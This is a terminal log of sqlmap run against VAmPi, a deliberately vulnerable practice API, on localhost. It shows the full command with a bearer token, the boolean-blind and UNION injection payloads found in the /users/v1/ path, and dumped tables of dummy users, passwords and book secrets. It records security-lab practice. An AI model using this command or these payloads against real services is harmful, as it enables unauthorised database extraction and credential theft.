(VAmPi_venv) ilya@ilya-vb:~/vampi-security-project$ sqlmap -u "http://localhost:5002/users/v1/*ilya3*" --method=GET --headers="Accept: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDI5NzcwODMsImlhdCI6MTc0Mjk3NzAyMywic3ViIjoiaWx5YTMifQ.MY0GBoL_O8zfsWoV-tQ21mBdzWYIHCNKtRxyfzZJapY\nHost: localhost:5000" --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7#pip}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:20:31 /2025-03-26/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[11:20:33] [INFO] testing connection to the target URL
[11:20:33] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:20:33] [INFO] testing if the target URL content is stable
[11:20:34] [INFO] target URL content is stable
[11:20:34] [INFO] testing if URI parameter '#1*' is dynamic
[11:20:34] [WARNING] URI parameter '#1*' does not appear to be dynamic
[11:20:34] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'SQLite')
[11:20:35] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[11:20:35] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] y
[11:20:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:20:39] [WARNING] reflective value(s) found and filtering out
[11:20:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:20:39] [INFO] testing 'Generic inline queries'
[11:20:39] [INFO] testing 'SQLite inline queries'
[11:20:39] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[11:20:39] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)
[11:20:39] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[11:20:39] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[11:20:39] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[11:20:40] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[11:20:40] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[11:20:40] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[11:20:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:20:42] [WARNING] URI parameter '#1*' does not seem to be injectable
[11:20:42] [INFO] testing if URI parameter '#2*' is dynamic
[11:20:42] [WARNING] URI parameter '#2*' does not appear to be dynamic
[11:20:42] [INFO] heuristic (basic) test shows that URI parameter '#2*' might be injectable (possible DBMS: 'SQLite')
[11:20:42] [INFO] heuristic (XSS) test shows that URI parameter '#2*' might be vulnerable to cross-site scripting (XSS) attacks
[11:20:42] [INFO] testing for SQL injection on URI parameter '#2*'
[11:20:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:20:42] [INFO] URI parameter '#2*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[11:20:42] [INFO] testing 'Generic inline queries'
[11:20:42] [INFO] testing 'SQLite inline queries'
[11:20:42] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[11:20:42] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[11:20:42] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[11:20:42] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[11:20:42] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[11:20:42] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[11:20:42] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[11:20:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:20:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:20:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:20:42] [INFO] target URL appears to have 5 columns in query
[11:20:42] [INFO] URI parameter '#2*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#2*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:
---
Parameter: #2* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:5002/users/v1/ilya3' AND 2542=2542 AND 'MhDY'='MhDY

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: http://localhost:5002/users/v1/-8828' UNION ALL SELECT NULL,NULL,NULL,CHAR(113,113,120,113,113)||CHAR(109,77,89,77,99,75,78,79,89,87,97,104,98,117,72,113,115,98,71,104,78,86,107,80,69,74,107,106,118,107,107,77,112,68,118,103,71,102,71,90)||CHAR(113,118,112,112,113),NULL-- yTqJ
---
[11:20:44] [INFO] testing SQLite
[11:20:44] [INFO] confirming SQLite
[11:20:44] [INFO] actively fingerprinting SQLite
[11:20:44] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:20:44] [INFO] fetching tables for database: 'SQLite_masterdb'
[11:20:44] [INFO] fetching columns for table 'users'
[11:20:44] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[5 entries]
+----+-------+--------------------+-----------+----------+
| id | admin | email              | password  | username |
+----+-------+--------------------+-----------+----------+
| 1  | 0     | mail1@mail.com     | pass1     | name1    |
| 2  | 0     | mail2@mail.com     | pass2     | name2    |
| 3  | 1     | admin@mail.com     | pass1     | admin    |
| 4  | 0     | megamail@gmail.com | multipass | ilya3    |
| 5  | 1     | megamail@gmail.com | megapass  | ilya4    |
+----+-------+--------------------+-----------+----------+

[11:20:44] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/ilya/snap/sqlmap/36/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/users.csv'
[11:20:44] [INFO] fetching columns for table 'books'
[11:20:44] [INFO] fetching entries for table 'books'
Database: <current>
Table: books
[4 entries]
+----+---------+-------------+------------------------+
| id | user_id | book_title  | secret_content         |
+----+---------+-------------+------------------------+
| 1  | 1       | bookTitle31 | secret for bookTitle31 |
| 2  | 2       | bookTitle52 | secret for bookTitle52 |
| 3  | 3       | bookTitle33 | secret for bookTitle33 |
| 4  | 5       | lotr        | sauron_secret          |
+----+---------+-------------+------------------------+

[11:20:44] [INFO] table 'SQLite_masterdb.books' dumped to CSV file '/home/ilya/snap/sqlmap/36/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/books.csv'
[11:20:44] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 271 times, 500 (Internal Server Error) - 12 times
[11:20:44] [INFO] fetched data logged to text files under '/home/ilya/snap/sqlmap/36/.local/share/sqlmap/output/localhost'
[11:20:44] [WARNING] your sqlmap version is outdated

[*] ending @ 11:20:44 /2025-03-26/
